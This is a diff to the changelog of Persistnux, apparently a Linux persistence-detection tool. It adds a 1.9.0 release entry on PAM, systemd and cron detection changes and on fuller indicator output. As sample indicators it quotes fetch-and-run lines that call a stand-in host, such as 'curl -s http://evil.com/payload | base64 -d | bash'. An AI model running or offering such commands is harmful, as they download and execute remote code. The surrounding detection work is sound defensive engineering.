@@ -5,6 +5,56 @@ All notable changes to Persistnux will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.9.0] - 2026-02-21
+
+### Removed
+- **SSH Persistence Detection**: Completely removed SSH detection module
+  - SSH authorized_keys, configs, and sshd_config checks removed
+  - Rationale: High false positive rate with limited forensic value
+  - Detection steps reduced from 8 to 7
+
+### Changed
+- **PAM Detection Rewrite**: Replaced naive whitelist with package verification
+  - Previous: Hardcoded whitelist of 6 PAM modules, flagged everything else as "unusual"
+  - Now: Verifies actual .so files using `is_package_managed()`
+  - Verified modules → skipped, Modified → CRITICAL, Unmanaged → HIGH
+  - Eliminates false positives from legitimate system PAM modules
+
+- **Systemd Service Filtering**: Skip non-actionable services
+  - Disabled services are now skipped (not a persistence risk)
+  - Services without ExecStart are skipped (nothing to analyze)
+  - Only `.service` files are scanned (not `.socket` or `.timer`)
+
+- **matched_string Output**: Now shows full suspicious line, not just keyword
+  - Previous: `matched_string: "eval"`
+  - Now: `matched_string: "eval \"$(curl http://evil.com)\""`
+  - Applied to all detection methods: SystemD, Cron, MOTD, Shell Profiles, etc.
+
+### Fixed
+- **Package Verification for Symlinked Paths**: Added `realpath` canonicalization
+  - `/lib` → `/usr/lib` symlinks now resolved before `dpkg -S` query
+  - Fixes false positives where PAM modules were marked "unmanaged"
+
+- **matched_pattern/matched_string**: Now included in ALL detection methods
+  - Previously only systemd had these fields populated
+  - Now: Cron, Shell Profiles, Init Scripts, MOTD, PAM, Git Config, etc.
+
+### Added
+- **Cron Content Preview**: Unmanaged scripts show file content preview
+  - Previous: `unmanaged_script:/path/to/script`
+  - Now: `unmanaged_script:#!/bin/bash curl http://... | sh`
+
+### Security Impact
+
+**Reduced False Positives**:
+- PAM modules like `pam_env.so`, `pam_limits.so` no longer flagged as "unusual"
+- Disabled systemd services no longer reported
+- Services without ExecStart no longer analyzed
+
+**Better Forensic Output**:
+- `matched_string` field now contains actionable IOC data
+- Analysts can see exact malicious commands without reading source files
+
 ## [1.7.2] - 2026-01-28
 
 ### Fixed
@@ -491,6 +541,12 @@ curl -s http://evil.com/payload | base64 -d | bash
 
 ## Version History Summary
 
+- **v1.9.0**: Removed SSH detection, rewrote PAM detection, enhanced matched_string output
+- **v1.7.x**: Interpreter detection, package verification, entropy analysis
+- **v1.6.0**: Package integrity verification, entropy-based obfuscation detection
+- **v1.5.0**: Script content analysis for deep inspection
+- **v1.4.0**: Restructured CSV/JSONL output with dedicated columns
+- **v1.3.0**: Content-based validation replacing name-based whitelisting
 - **v1.2.0**: False positive reduction with package manager integration
 - **v1.1.0**: Critical bug fix + enhanced detection patterns
 - **v1.0.0**: Initial release with comprehensive persistence detection
